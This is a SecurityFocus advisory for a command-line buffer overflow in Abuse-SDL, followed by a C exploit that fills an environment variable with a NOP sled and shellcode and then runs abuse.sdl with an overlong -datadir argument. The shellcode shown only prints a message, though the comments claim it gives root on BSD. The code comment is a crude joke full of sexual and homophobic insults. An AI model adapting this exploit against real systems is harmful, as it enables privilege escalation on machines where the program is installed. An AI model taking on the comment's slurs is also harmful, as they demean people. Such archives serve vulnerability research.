source: http://www.securityfocus.com/bid/7982/info

A buffer overflow vulnerability has been reported for Abuse-SDL that may result in the execution of attacker-supplied code. The vulnerability exists due to insufficient bounds checking performed on certain command-line options. 

/*
	hey all.. this is a l33t 0x36 0day exploit by Matrix_DK :)
	This should give root, i give root to by the way, 
	on all BSD systems with abuse installed.
	-r-xr-xr-x	1	root	wheel	675344 Jun 18 13:37
	hi hi owned by root group wheel.. this is a hacker goodie

	I hoped abuse was my favorite game assabuse portet to unix..
	so i tried to load pics of my boyfriend johnlw ass into the game
	using -datadir... but the program died???

	could this be exploitet???
	
	i tried to exploit this myself, but i have no skillz. So i 
	asked the other gays from 0x36, but there did not know how
	to do this hardcore command line overflows.
	I asked inv, but he told me to go ass fuck casto... inv is l33t
	he knows many exploit tricks.. he is my hero..
	
	So i had to steal some code from 
	'smashing the stack for fun and profit' to get it to work...
	but now i have become a hacker i am going to send out many 
	advisories so other people know im a hacker.. and one day maybe if 
	i am lucky i can send out some exploits to.. but i have to get some
	unix, debug and code skillz first... 

	i have made the shellcode myself.. look how l33t it is, it prints 
	'what is the matrix ?' :).. that is cool.. us real hackers love the 
	matrix, we jerk off to trinity in slow motion, and use nicks from 
	the movie.
	
*/


#include <stdlib.h>

#define DEFAULT_BUFFER_SIZE            350
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] = "\x31\xc0\x50\x68\x69\x78\x20\x3f\x68\x6d"
		   "\x61\x74\x72\x68\x74\x68\x65\x20\x68\x20"
		   "\x69\x73\x20\x68\x77\x68\x61\x74\x89\xe3"
		   "\x6a\x14\x53\x50\x50\xb0\x04\xcd\x80\x31"
		   "\xc0\xb0\x01\xcd\x80";
    
unsigned long get_esp(void) {
    __asm__("movl %esp,%eax");
}

int main() {
char *buff, *ptr, *egg;
long *addr_ptr, addr;
int bsize=DEFAULT_BUFFER_SIZE;
int i, eggsize=DEFAULT_EGG_SIZE;

addr = get_esp();

buff = malloc(bsize);
egg = malloc(eggsize);

ptr = buff;

addr_ptr = (long *) ptr;
for (i = 0; i < bsize; i+=4)
*(addr_ptr++) = addr;
                                                             
ptr = egg;
for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;
                                                                     
for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
                                                                           
buff[bsize - 1] = '\0';
egg[eggsize - 1] = '\0';
                                                                               
memcpy(egg,"EGG=",4);
putenv(egg);
memcpy(buff,"RET=",4);
putenv(buff);
system("/usr/local/bin/abuse.sdl -datadir $RET");

}